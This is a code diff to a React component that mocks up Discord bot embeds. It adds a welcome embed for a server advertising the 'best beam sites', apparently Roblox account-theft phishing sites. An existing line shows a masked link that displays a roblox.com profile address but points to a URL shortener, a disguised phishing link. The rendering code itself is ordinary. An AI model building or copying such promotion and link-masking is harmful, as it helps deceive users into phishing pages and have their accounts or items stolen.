@@ -17,6 +17,11 @@ const DC = {
 const EXAMPLE_FMT      = "[https://www.roblox.com/users/387872695312/profile](https://linkurlshort.page.gd/index.php?r=3am4vBE)";
 const GIF_URL          = "https://image2url.com/r2/default/gifs/1768488617981-bdc4c780-144f-4a40-8906-ddf01eadb705.gif";
 
+const WELCOME_DESC =
+  "**─── <a:emoji_8:1506236357775720548> `ɪɴꜱᴀɴɪᴛʏ   | ɢᴀᴛᴇᴡᴀʏ` <a:emoji_8:1506236357775720548> ───\n\n" +
+  "<a:emoji_3:1500695831169204295> ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴏᴜʀ ꜱᴇʀᴠᴇʀ ᴛʜᴀᴛ ʜᴀꜱ ᴍᴀɴʏ ꜰᴇᴀᴛᴜʀᴇꜱ ᴀɴᴅ ʙᴇꜱᴛ ꜱɪᴛᴇꜱ ᴇxɪꜱᴛ\n\n" +
+  "<:emoji_4:1501269124330950787> ʙᴇꜱᴛ ʙᴇᴀᴍ ꜱɪᴛᴇꜱ ᴏꜰ ᴀʟʟ ᴛɪᴍᴇ**";
+
 // ── Parse Discord custom emoji syntax into <img> tags ───────────────────────────
 // Handles: <a:name:id> (animated) and <:name:id> (static)
 function parseEmoji(text: string): React.ReactNode[] {
@@ -180,6 +185,60 @@ export default function DiscordEmbedMockup() {
             />
             <span className="text-[11px]" style={{ color: DC.muted }}>
               Requested by exampleuser
+            </span>
+          </div>
+        </div>
+      </div>
+
+      {/* ── Welcomer embed (fires on guildMemberAdd) ── */}
+      <div className="pt-2">
+        <p className="text-[11px] font-semibold mb-2 uppercase tracking-wider" style={{ color: DC.muted }}>
+          #gateway — welcomer preview
+        </p>
+
+        {/* Mention line */}
+        <p className="text-sm mb-1.5" style={{ color: "#c9d1f9" }}>
+          <span
+            className="px-1 py-0.5 rounded text-xs font-semibold"
+            style={{ backgroundColor: "rgba(88,101,242,0.3)", color: "#c9d1f9" }}
+          >
+            @exampleuser
+          </span>
+        </p>
+
+        <div
+          className="rounded overflow-hidden max-w-md"
+          style={{ backgroundColor: DC.bg, borderLeft: `4px solid ${DC.codeBg}` }}
+        >
+          <div className="p-3 pb-2">
+            <p
+              style={{ color: DC.body, fontWeight: 600 }}
+              className="text-xs leading-relaxed"
+            >
+              {parseEmoji(WELCOME_DESC.replace(/\*\*/g, ""))}
+            </p>
+            <div className="mt-3 rounded overflow-hidden">
+              <img
+                src={GIF_URL}
+                alt="Welcome banner"
+                className="w-full object-cover rounded"
+                style={{ maxHeight: 200 }}
+              />
+            </div>
+          </div>
+          {/* Footer with avatar */}
+          <div
+            className="px-3 pb-2.5 flex items-center gap-2 border-t"
+            style={{ borderColor: DC.codeBg }}
+          >
+            <img
+              src="/placeholder.svg?height=16&width=16"
+              alt="New member avatar"
+              className="rounded-full shrink-0"
+              style={{ width: 16, height: 16 }}
+            />
+            <span className="text-[11px]" style={{ color: DC.muted }}>
+              Welcome exampleuser
             </span>
           </div>
         </div>
